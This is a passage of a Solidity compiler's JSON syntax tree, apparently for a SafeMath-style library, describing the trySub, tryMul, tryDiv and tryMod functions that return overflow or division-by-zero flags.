																"src": "1120:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1116:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 206,
														"nodeType": "IfStatement",
														"src": "1112:28:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 202,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1131:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 203,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1138:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 204,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1130:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 198,
															"id": 205,
															"nodeType": "Return",
															"src": "1123:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 207,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1162:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 210,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 208,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 190,
																		"src": "1168:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"id": 209,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 192,
																		"src": "1172:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "1168:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 211,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "1161:13:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 198,
														"id": 212,
														"nodeType": "Return",
														"src": "1154:20:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 188,
										"nodeType": "StructuredDocumentation",
										"src": "863:134:2",
										"text": " @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 215,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "trySub",
									"nameLocation": "1011:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 193,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 190,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "1026:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 215,
												"src": "1018:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 189,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1018:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 192,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "1037:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 215,
												"src": "1029:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 191,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1029:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1017:22:2"
									},
									"returnParameters": {
										"id": 198,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 195,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 215,
												"src": "1063:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 194,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1063:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 197,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 215,
												"src": "1069:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 196,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1069:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1062:15:2"
									},
									"scope": 464,
									"src": "1002:189:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 256,
										"nodeType": "Block",
										"src": "1415:417:2",
										"statements": [
											{
												"id": 255,
												"nodeType": "UncheckedBlock",
												"src": "1425:401:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 229,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 227,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 218,
																"src": "1683:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "30",
																"id": 228,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1688:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "1683:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 234,
														"nodeType": "IfStatement",
														"src": "1679:28:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "74727565",
																		"id": 230,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1699:4:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "true"
																	},
																	{
																		"hexValue": "30",
																		"id": 231,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1705:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 232,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1698:9:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 226,
															"id": 233,
															"nodeType": "Return",
															"src": "1691:16:2"
														}
													},
													{
														"assignments": [
															236
														],
														"declarations": [
															{
																"constant": false,
																"id": 236,
																"mutability": "mutable",
																"name": "c",
																"nameLocation": "1729:1:2",
																"nodeType": "VariableDeclaration",
																"scope": 255,
																"src": "1721:9:2",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 235,
																	"name": "uint256",
																	"nodeType": "ElementaryTypeName",
																	"src": "1721:7:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"visibility": "internal"
															}
														],
														"id": 240,
														"initialValue": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 239,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 237,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 218,
																"src": "1733:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"id": 238,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 220,
																"src": "1737:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1733:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "1721:17:2"
													},
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 245,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 243,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 241,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 236,
																	"src": "1756:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"id": 242,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 218,
																	"src": "1760:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1756:5:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"id": 244,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 220,
																"src": "1765:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1756:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 250,
														"nodeType": "IfStatement",
														"src": "1752:33:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 246,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1776:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 247,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1783:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 248,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1775:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 226,
															"id": 249,
															"nodeType": "Return",
															"src": "1768:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 251,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1807:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"id": 252,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 236,
																	"src": "1813:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 253,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "1806:9:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 226,
														"id": 254,
														"nodeType": "Return",
														"src": "1799:16:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 216,
										"nodeType": "StructuredDocumentation",
										"src": "1197:137:2",
										"text": " @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 257,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMul",
									"nameLocation": "1348:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 221,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 218,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "1363:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 257,
												"src": "1355:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 217,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1355:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 220,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "1374:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 257,
												"src": "1366:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 219,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1366:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1354:22:2"
									},
									"returnParameters": {
										"id": 226,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 223,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 257,
												"src": "1400:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 222,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1400:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 225,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 257,
												"src": "1406:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 224,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1406:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1399:15:2"
									},
									"scope": 464,
									"src": "1339:493:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 284,
										"nodeType": "Block",
										"src": "2057:114:2",
										"statements": [
											{
												"id": 283,
												"nodeType": "UncheckedBlock",
												"src": "2067:98:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 271,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 269,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 262,
																"src": "2095:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "30",
																"id": 270,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2100:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "2095:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 276,
														"nodeType": "IfStatement",
														"src": "2091:29:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 272,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2111:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 273,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2118:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 274,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "2110:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 268,
															"id": 275,
															"nodeType": "Return",
															"src": "2103:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 277,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2142:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 280,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 278,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 260,
																		"src": "2148:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"id": 279,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 262,
																		"src": "2152:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "2148:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 281,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "2141:13:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 268,
														"id": 282,
														"nodeType": "Return",
														"src": "2134:20:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 258,
										"nodeType": "StructuredDocumentation",
										"src": "1838:138:2",
										"text": " @dev Returns the division of two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 285,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryDiv",
									"nameLocation": "1990:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 263,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 260,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "2005:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 285,
												"src": "1997:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 259,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1997:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 262,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "2016:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 285,
												"src": "2008:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 261,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2008:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1996:22:2"
									},
									"returnParameters": {
										"id": 268,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 265,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 285,
												"src": "2042:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 264,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2042:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 267,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 285,
												"src": "2048:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 266,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2048:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2041:15:2"
									},
									"scope": 464,
									"src": "1981:190:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 312,
										"nodeType": "Block",
										"src": "2406:114:2",
										"statements": [
											{
												"id": 311,
												"nodeType": "UncheckedBlock",
												"src": "2416:98:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 299,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 297,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 290,
																"src": "2444:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "30",
																"id": 298,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2449:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "2444:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 304,
														"nodeType": "IfStatement",
														"src": "2440:29:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 300,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2460:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 301,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2467:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 302,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "2459:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 296,
															"id": 303,
															"nodeType": "Return",
															"src": "2452:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 305,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2491:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 308,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 306,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 288,
																		"src": "2497:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"id": 307,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 290,
																		"src": "2501:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "2497:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 309,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "2490:13:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 296,
														"id": 310,
														"nodeType": "Return",
														"src": "2483:20:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 286,
										"nodeType": "StructuredDocumentation",
										"src": "2177:148:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 313,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMod",
									"nameLocation": "2339:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 291,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 288,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "2354:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 313,
												"src": "2346:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 287,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2346:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 290,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "2365:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 313,
												"src": "2357:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
